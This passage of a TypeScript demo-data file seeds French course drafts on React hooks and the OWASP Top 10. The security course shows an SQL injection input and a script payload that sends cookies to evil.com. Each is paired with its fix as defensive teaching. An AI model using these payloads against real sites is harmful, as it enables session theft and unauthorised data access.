      <input name="email" value={form.email} onChange={handleChange} />
      <textarea name="message" value={form.message} onChange={handleChange} />
    </form>
  );
}
\`\`\`

## useEffect — effets de bord

\`\`\`jsx
import { useState, useEffect } from 'react';

function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Exécuté après chaque rendu où userId change
    setLoading(true);
    fetch(\`/api/users/\${userId}\`)
      .then(res => res.json())
      .then(data => {
        setUser(data);
        setLoading(false);
      });

    // Fonction de nettoyage (cleanup)
    return () => {
      // Annuler les requêtes en cours si le composant est démonté
    };
  }, [userId]); // Tableau de dépendances

  if (loading) return <Spinner />;
  return <div>{user?.name}</div>;
}
\`\`\`

## Règles des dépendances useEffect

| Tableau | Comportement |
|---|---|
| \`[]\` | S'exécute une seule fois (montage) |
| \`[a, b]\` | S'exécute quand a ou b change |
| Absent | S'exécute après chaque rendu (rarement voulu) |
`,
      updatedAt: D(2),
    },
    {
      index: 4,
      filename: "04_Module.md",
      markdown: `# Hooks avancés et patterns

## useCallback et useMemo

\`\`\`jsx
import { useState, useCallback, useMemo } from 'react';

function ListeFiltrée({ items }) {
  const [filtre, setFiltre] = useState('');
  const [tri, setTri] = useState('asc');

  // useMemo : recalcule seulement quand items, filtre ou tri change
  const itemsFiltres = useMemo(() => {
    return items
      .filter(item => item.name.toLowerCase().includes(filtre.toLowerCase()))
      .sort((a, b) => tri === 'asc'
        ? a.name.localeCompare(b.name)
        : b.name.localeCompare(a.name)
      );
  }, [items, filtre, tri]);

  // useCallback : référence stable de la fonction
  const handleDelete = useCallback((id) => {
    // ... logique de suppression
  }, []); // dépendances vides = référence stable

  return (
    <div>
      <input value={filtre} onChange={e => setFiltre(e.target.value)} />
      <button onClick={() => setTri(t => t === 'asc' ? 'desc' : 'asc')}>
        Trier {tri === 'asc' ? '↑' : '↓'}
      </button>
      {itemsFiltres.map(item => (
        <Item key={item.id} item={item} onDelete={handleDelete} />
      ))}
    </div>
  );
}
\`\`\`

## Custom hooks — réutiliser la logique

\`\`\`jsx
// hooks/useFetch.js
function useFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const controller = new AbortController();
    setLoading(true);

    fetch(url, { signal: controller.signal })
      .then(res => {
        if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
        return res.json();
      })
      .then(setData)
      .catch(err => {
        if (err.name !== 'AbortError') setError(err.message);
      })
      .finally(() => setLoading(false));

    return () => controller.abort();
  }, [url]);

  return { data, loading, error };
}

// Utilisation
function Produits() {
  const { data: produits, loading, error } = useFetch('/api/produits');

  if (loading) return <Skeleton />;
  if (error) return <Alert message={error} />;
  return <GrilleProduits produits={produits} />;
}
\`\`\`
`,
      updatedAt: D(2),
    },
    {
      index: 5,
      filename: "05_Module.md",
      markdown: `# Gestion d'état globale et bonnes pratiques

## Context API — état partagé

\`\`\`jsx
// contexts/AuthContext.jsx
import { createContext, useContext, useState } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);

  const login = async (email, password) => {
    const data = await authenticate(email, password);
    setUser(data.user);
  };

  const logout = () => setUser(null);

  return (
    <AuthContext.Provider value={{ user, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

export const useAuth = () => {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth doit être dans AuthProvider');
  return ctx;
};

// Dans App.jsx
<AuthProvider>
  <Router>
    <App />
  </Router>
</AuthProvider>

// Dans n'importe quel composant
function Header() {
  const { user, logout } = useAuth();
  return user ? <button onClick={logout}>{user.name}</button> : <LoginLink />;
}
\`\`\`

## Bonnes pratiques React

- **Co-location** : placer l'état au plus proche de là où il est utilisé
- **Composition** : préférer la composition à l'héritage
- **Memoization ciblée** : n'optimiser que ce qui est mesuré comme lent
- **Custom hooks** : extraire la logique réutilisable
- **Tests** : React Testing Library pour des tests orientés comportement

## Structure de projet recommandée

\`\`\`
src/
├── components/     # Composants réutilisables (Button, Modal…)
├── features/       # Modules fonctionnels (auth/, cart/, profile/…)
├── hooks/          # Custom hooks partagés
├── contexts/       # Contextes React
├── utils/          # Fonctions utilitaires
├── types/          # Types TypeScript
└── App.tsx
\`\`\`

## Récapitulatif de la formation

- React = UI déclarative basée sur des composants
- JSX = syntaxe HTML dans JavaScript
- Hooks = gestion d'état et effets de bord dans les composants fonctionnels
- Context API = état global sans librairie externe
- Les custom hooks permettent de réutiliser la logique entre composants

## Questions

Des questions sur React ?
`,
      updatedAt: D(2),
    },
  ],
};

// ─── Ébauche 5 — Sécurité Web OWASP ─────────────────────────────────────────
const OWASP: Draft = {
  id: "securite_web_owasp_top_10",
  createdAt: D(8),
  updatedAt: NOW,
  metadata: {
    displayName: "Sécurité web : OWASP Top 10",
    description:
      "Comprendre et contrer les 10 vulnérabilités web les plus critiques selon l'OWASP : injections, XSS, CSRF, mauvaise configuration et plus encore.",
    type: "Formation",
    level: "Intermédiaire",
    estimatedDuration: "2h30",
    tags: ["sécurité", "owasp", "web", "pentest", "cybersécurité"],
  },
  modules: [
    {
      index: 1,
      filename: "01_Module.md",
      markdown: `# Introduction à la sécurité web

## Pourquoi la sécurité web est critique

En 2023, le coût moyen d'une violation de données est de **4,45 millions de dollars** (IBM Cost of a Data Breach Report). Les attaques web représentent la majorité des incidents de sécurité.

> La sécurité n'est pas une fonctionnalité qu'on ajoute à la fin — c'est une contrainte de conception.

## L'OWASP

L'**Open Web Application Security Project** est une fondation à but non lucratif dédiée à l'amélioration de la sécurité des logiciels. Son document le plus connu, l'**OWASP Top 10**, liste les 10 risques de sécurité les plus critiques pour les applications web.

## OWASP Top 10 — 2021

| # | Catégorie | Exemple |
|---|---|---|
| A01 | Broken Access Control | Accès à des ressources d'autres utilisateurs |
| A02 | Cryptographic Failures | Mots de passe en clair, HTTP sans TLS |
| A03 | Injection | SQL injection, XSS |
| A04 | Insecure Design | Absence de rate limiting |
| A05 | Security Misconfiguration | Ports ouverts, configs par défaut |
| A06 | Vulnerable Components | Dépendances avec CVE connues |
| A07 | Auth Failures | Sessions non expirées, mots de passe faibles |
| A08 | Data Integrity Failures | Désérialisation non sécurisée |
| A09 | Logging Failures | Absence de logs d'audit |
| A10 | SSRF | Requêtes vers des ressources internes |

## Outils du module

- **OWASP ZAP** ou **Burp Suite** pour l'analyse
- **DVWA** (Damn Vulnerable Web App) pour pratiquer en sécurité
- **HackTheBox** / **TryHackMe** pour les labs
`,
      updatedAt: D(1),
    },
    {
      index: 2,
      filename: "02_Module.md",
      markdown: `# A03 — Injection (SQL, XSS, Command)

## SQL Injection

La vulnérabilité la plus connue. Elle survient quand des données non filtrées sont intégrées dans une requête SQL.

### Exemple vulnérable

\`\`\`php
// ❌ DANGEREUX — ne jamais faire ça
$username = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$username'";
mysql_query($query);
\`\`\`

Si l'attaquant envoie \`' OR '1'='1\` :
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1'
-- Retourne TOUS les utilisateurs !
\`\`\`

### Correctif — Requêtes préparées

\`\`\`php
// ✅ SÉCURISÉ
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_GET['user']]);
$user = $stmt->fetch();
\`\`\`

## XSS — Cross-Site Scripting

Injection de code JavaScript malveillant dans une page web consultée par d'autres utilisateurs.

### Exemple vulnérable

\`\`\`html
<!-- ❌ Affichage direct de l'input utilisateur -->
<div>Bienvenue, <?= $_GET['name'] ?></div>
\`\`\`

Si l'attaquant envoie \`<script>document.location='https://evil.com/steal?c='+document.cookie</script>\` → vol de session.

### Correctif

\`\`\`php
// ✅ Encoder les caractères spéciaux HTML
<div>Bienvenue, <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?></div>
\`\`\`

\`\`\`javascript
// ✅ En JavaScript — utiliser textContent, pas innerHTML
element.textContent = userInput; // ✅
element.innerHTML = userInput;   // ❌ Dangereux
\`\`\`

## Content Security Policy (CSP)

\`\`\`http
Content-Security-Policy: default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
\`\`\`
`,
      updatedAt: NOW,
    },
    {
      index: 3,
      filename: "03_Module.md",
      markdown: `# A01, A02, A07 — Accès, Crypto, Authentification

## A01 — Broken Access Control

### Types de vulnérabilités

- **IDOR** (Insecure Direct Object Reference) : \`/api/orders/1234\` → modifier l'ID pour accéder aux commandes d'autres utilisateurs
- **Privilege escalation** : un utilisateur normal accède à des fonctions admin
- **Forced browsing** : accès à \`/admin\` sans vérification

### Correctif

\`\`\`javascript
// ❌ Vulnérable — fait confiance à l'ID envoyé par le client
app.get('/api/orders/:id', async (req, res) => {
  const order = await Order.findById(req.params.id);
  res.json(order);
});

// ✅ Sécurisé — vérifie que la ressource appartient à l'utilisateur
app.get('/api/orders/:id', authenticate, async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.id,
    userId: req.user.id  // Toujours filtrer par l'utilisateur authentifié
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});
\`\`\`

## A02 — Cryptographic Failures

### Erreurs fréquentes

- Stocker des mots de passe en clair ou avec MD5/SHA1
- Transmettre des données sensibles en HTTP
- Utiliser des clés cryptographiques codées en dur
- IV/nonce réutilisés en AES

### Hachage sécurisé des mots de passe

\`\`\`javascript
const bcrypt = require('bcrypt');

// Hachage (à l'inscription)
const SALT_ROUNDS = 12;
const hash = await bcrypt.hash(password, SALT_ROUNDS);

// Vérification (à la connexion)
const isValid = await bcrypt.compare(password, storedHash);
\`\`\`

> Ne jamais utiliser MD5, SHA-1 ou SHA-256 seuls pour les mots de passe — ils sont trop rapides. Utiliser **bcrypt**, **argon2** ou **scrypt**.

## A07 — Authentication Failures

### Checklist

- [ ] Longueur minimale des mots de passe : 12 caractères
- [ ] Blocage après N tentatives échouées (rate limiting)
- [ ] Multi-factor authentication (MFA) disponible
- [ ] Sessions expirées après inactivité
- [ ] Invalidation des sessions à la déconnexion
- [ ] Jetons JWT avec expiration courte + refresh tokens
- [ ] Pas de secrets dans les URLs (tokens de réinitialisation → POST)
`,
      updatedAt: NOW,
    },
    {
      index: 4,
      filename: "04_Module.md",
      markdown: `# Défense en profondeur et checklist finale

## Le principe de défense en profondeur

Ne jamais compter sur une seule mesure de sécurité. Chaque couche compense les failles potentielles des autres.

\`\`\`
Réseau       →  Firewall, WAF, DDoS protection
Infrastructure  →  Mise à jour OS, isolation des services
Application  →  Validation des entrées, requêtes préparées
Données      →  Chiffrement au repos, backups chiffrés
Utilisateurs →  MFA, formation, moindre privilège
Monitoring   →  Logs, alertes, détection d'anomalies
\`\`\`

## Headers HTTP de sécurité

\`\`\`http
# Empêche le clickjacking
X-Frame-Options: DENY

# Empêche le MIME-sniffing
X-Content-Type-Options: nosniff

# Active le HSTS (forcer HTTPS)
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Referrer minimal
Referrer-Policy: strict-origin-when-cross-origin

# Permissions API navigateur
Permissions-Policy: camera=(), microphone=(), geolocation=()
\`\`\`

## Gestion des dépendances

\`\`\`bash
# Audit des vulnérabilités connues
npm audit
npm audit fix

# Vérification continue avec Snyk
npx snyk test

# Mettre à jour les dépendances régulièrement
npm outdated
npm update
\`\`\`

## Checklist OWASP — avant chaque mise en production

**Injection**
- [ ] Requêtes préparées ou ORM pour toutes les requêtes BDD
- [ ] Validation et sanitisation de toutes les entrées

**Authentification**
- [ ] Hachage bcrypt/argon2 pour les mots de passe
- [ ] Rate limiting sur les endpoints d'auth
- [ ] MFA disponible

**Données**
- [ ] HTTPS forcé avec HSTS
- [ ] Chiffrement des données sensibles au repos
- [ ] Pas de secrets dans le code source

**Configuration**
- [ ] Headers de sécurité configurés
- [ ] Ports inutiles fermés
- [ ] Mode debug désactivé en production

**Monitoring**
- [ ] Logs des événements de sécurité
- [ ] Alertes sur comportements anormaux
- [ ] Plan de réponse aux incidents

## Récapitulatif de la formation

- L'OWASP Top 10 couvre les risques les plus fréquents et impactants
- Les injections se préviennent par les requêtes préparées et la validation
- L'authentification robuste requiert bcrypt, rate limiting et MFA
- Les headers HTTP de sécurité sont une première ligne de défense simple
- La sécurité est un processus continu, pas un état final

## Questions

Des questions sur la sécurité web ?
`,
      updatedAt: NOW,
    },
  ],
};

// ─── Export ───────────────────────────────────────────────────────────────────

export const DEMO_DRAFTS: Draft[] = [DOCKER, GIT, SQL, REACT, OWASP];

const STORAGE_KEY = "presenter_drafts";

export function seedDemoData(): void {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(DEMO_DRAFTS));
}
